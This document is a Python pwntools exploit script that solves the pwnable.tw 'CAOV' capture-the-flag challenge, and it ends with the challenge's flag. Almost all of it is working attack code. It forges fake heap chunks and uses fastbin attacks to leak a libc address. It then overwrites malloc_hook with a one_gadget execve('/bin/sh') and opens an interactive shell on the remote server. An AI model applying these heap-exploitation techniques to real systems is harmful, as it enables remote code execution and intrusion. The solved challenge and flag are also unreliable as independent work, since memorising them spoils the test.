from pwn import *

#r = process("./C", env={"LD_PRELOAD" : "./libc_64.so.6"})
r = remote("chall.pwnable.tw",10306)
def show():
    r.sendlineafter(b'Your choice: ',b'1')

def set_name(name) :
    r.sendlineafter(b'name: ',name)

def edit(name, length, key, value):
    r.sendlineafter(b'Your choice: ',b'2')
    set_name(name)
    r.sendlineafter(b'length: ',str(length))
    r.sendlineafter(b'Key: ',key)
    r.sendlineafter(b'Value:',str(value))
'''
vuln 1 : set_name and edit in line 186 187 use same buffer, and edit use buffer to set old Data value and call destruct
but the value use by set_name don't zero when 0x40198e call, this lead to 0x401E6A destruction will free the ptr will leave in stack
0x007fffe3624c10│+0x0000: 0x0000000000000000     ← call destruct at 0x401563
0x007fffe3624c18│+0x0008: 0x0000000000000000
0x007fffe3624c20│+0x0010: 0x0000000000000000
0x007fffe3624c28│+0x0018: 0x0000000000000000
0x007fffe3624c30│+0x0020: 0x0000000000000000
0x007fffe3624c38│+0x0028: 0x0000000000000000
0x007fffe3624c40│+0x0030: "bbbbbbbb"   ← call destruct at  0x4014F5
0x007fffe3624c48│+0x0038: 0x0000000000000000
'''
name_addr = 0x6032c0

set_name(b'123\x00456')
r.sendlineafter(b'key: ',b'a'*0x10)
r.sendlineafter(b'value:',b'55555')

#### create fake_chunk at 0x6032d0 
fake_chunk = p64(0) + p64(0x71) 
fake_chunk = fake_chunk.ljust(0x60,b'\x00') + p64(0x6032d0) + p64(0)*2 + p64(0x21)
edit(fake_chunk ,123,b'b'*0x20,213)

### use fastbin attack to get chunk at 0x603285 to overwrite Data ptr
edit(p64(0) + p64(0x71) + p64(0x603285),123,b'b'*0x20,213)
edit(b'\x00' ,0x60,b'b'*0x25+b'\x21',213)

### create fake Data struct to leak data
edit(b'\x00' ,0x60,b'\x00'*3 + b'\x00'*8 + p64(0x6032e0)  + p64(0)*4 + p64(0x71) + p64(0)*2 + p64(0x602f28) + p64(0)  ,213)
r.recvuntil(b'Your data info after editing:')
r.recvuntil(b'Key: ')
libc = u64(r.recv(6) + b'\x00\x00')- 0x6fe70
print(f'libc : {hex(libc)}')

'''
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0567 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
'''
realloc :
0x83b1b
'''

### another fastbin attack to overwrite malloc_hook
fake_chunk = p64(0x555555) + p64(0x71) + p64(0) + p64(0) + p64(0x6032c0)
fake_chunk = fake_chunk.ljust(0x60,b'\x00') + p64(0x6032d0) + p64(0)*2 + p64(0x21)
edit(fake_chunk ,123,b'b'*0x30,213)

edit(p64(0) + p64(0x71) + p64(libc+0x3c3aed),123,b'b'*1,213)
edit(b'aaaaa' ,0x60,b'b'*1,213)

data = b'\x00'*3 + p64(0)*2 + p64(libc+0xf0567)
edit(b'\x55\x55' ,0x60,b'\x00'*3 + p64(0) + p64(libc+0x4526a) + p64(libc+0x83b10),213) ## write one_gadget

r.interactive()

#FLAG{CAOV_stands_f0r_C0py_Ass1gnment_Operat0r_Vuln3rabil1ty_r3memb3r_alway5_r3turn_r3ference_typ3}